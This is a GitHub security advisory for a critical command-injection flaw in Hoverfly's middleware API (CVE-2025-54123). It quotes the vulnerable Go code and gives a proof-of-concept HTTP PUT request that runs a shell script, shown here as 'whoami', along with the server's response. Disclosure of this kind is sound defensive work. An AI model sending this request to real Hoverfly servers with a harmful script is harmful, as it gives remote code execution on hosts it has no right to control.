# Hoverfly is vulnerable to Remote Code Execution through an insecure middleware implementation

**GHSA**: GHSA-r4h8-hfp2-ggmf | **CVE**: CVE-2025-54123 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-20, CWE-78

**Affected Packages**:
- **github.com/SpectoLabs/hoverfly** (go): <= 1.11.3

## Description

### Summary
It has been discovered that the middleware functionality in Hoverfly is vulnerable to command injection through its `/api/v2/hoverfly/middleware` endpoint due to insufficient validation and sanitization in user input.

### Details
The vulnerability exists in the middleware management API endpoint `/api/v2/hoverfly/middleware`. 

This issue is born due to combination of three code level flaws:

1. Insufficient Input Validation in [middleware.go line 94-96](https://github.com/SpectoLabs/hoverfly/blob/master/core/middleware/middleware.go#L93):

```
func (this *Middleware) SetBinary(binary string) error {
    this.Binary = binary  // No validation of binary parameter here
    return nil
}
```

2. Unsafe Command Execution in [local_middleware.go line 14-19](https://github.com/SpectoLabs/hoverfly/blob/master/core/middleware/local_middleware.go#L13):

```
var middlewareCommand *exec.Cmd
if this.Script == nil {
    middlewareCommand = exec.Command(this.Binary)  // User-controlled binary
} else {
    middlewareCommand = exec.Command(this.Binary, this.Script.Name())  // User-controlled binary and script
}
```

3. Immediate Execution During Testing in [hoverfly_service.go line 173](https://github.com/SpectoLabs/hoverfly/blob/master/core/hoverfly_service.go#L173):

```
_, err = newMiddleware.Execute(testData)  // Executes middleware immediately for testing
```

### POC

1. Send the below HTTP PUT request to `http://localhost:8888` in order to create our malicious middleware, this will execute a simple `whoami` command on target. (ADMIN UI/API)

Here, when you send this request, The hoverify will processes the request and writes the script to a temporary file and During middleware validation, Hoverfly executes: `/bin/bash /tmp/{hoverfly_script}`, and Boom! The malicious script will get executed with Hoverfly's privileges.

```
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: localhost:8888
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8888/dashboard
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 101

{
    "binary": "/bin/bash",
    "script": "whoami"
}
```

```
HTTP/1.1 422 Unprocessable Entity
Date: Sat, 12 Jul 2025 15:55:49 GMT
Content-Length: 540
Content-Type: text/plain; charset=utf-8

{"error":"Failed to unmarshal JSON from middleware\nCommand: /bin/bash /var/folders/c6/c708mhjj12j_d5sg_s80pybc0000gn/T/hoverfly/hoverfly_2749637664\ninvalid character 'k' looking for beginning of value\n\nSTDIN:\n{\"response\":{\"status\":200,\"body\":\"ok\",\"encodedBody\":false,\"headers\":{\"test_header\":[\"true\"]}},\"request\":{\"path\":\"/\",\"method\":\"GET\",\"destination\":\"www.test.com\",\"scheme\":\"\",\"query\":\"\",\"formData\":null,\"body\":\"\",\"headers\":{\"test_header\":[\"true\"]}}}\n\nSTDOUT:\nkr1shna4garwal\n"}
```
(Here, the user is `kr1shna4garwal`)

### Impact

This allows an attacker to gain remote code execution (RCE) on any system running the vulnerable Hoverfly service. Since the input is directly passed to system commands without proper checks, an attacker can upload a malicious payload or directly execute arbitrary commands (including reverse shells) on the host server with the privileges of the hoverfly process.

Reporter:
@kr1shna4garwal
